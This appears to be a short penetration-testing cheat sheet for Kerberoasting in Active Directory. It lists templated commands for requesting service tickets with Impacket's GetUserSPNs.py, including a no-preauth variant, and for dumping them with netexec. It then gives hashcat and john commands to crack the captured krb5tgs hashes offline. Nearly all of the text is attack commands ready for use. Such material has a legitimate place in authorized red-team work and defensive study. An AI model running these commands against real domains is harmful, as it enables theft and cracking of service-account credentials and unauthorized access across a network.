# GetUserSPNs
#plateform/linux #target/remote #cat/ATTACK

## GetUserSPNs 
```
GetUserSPNs.py   -usersfile <users_file|users.txt> -outputfile hashes.asreproast <domain>/
```

## Kerberoast Pre-Auth attack
```
GetUserSPNs.py -dc-ip <DC_IP_ADDRESS> <domain>/ -usersfile <users_file> -no-preauth "<No_preauth_account>"
```

## Kerberoasting using nxc
```
netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting kerberoastables.txt --kdcHost <KeyDistributionCenter>
```

## Crack GetUserSPNs using hashcat
```
hashcat -m 13100 --force -a 0 <hash_file> </path/to/wordlist>
```

## crack GetUserSPNs using john
```
john --format=krb5tgs --wordlist=</path/to/wordlist> kerberoastables.txt
```

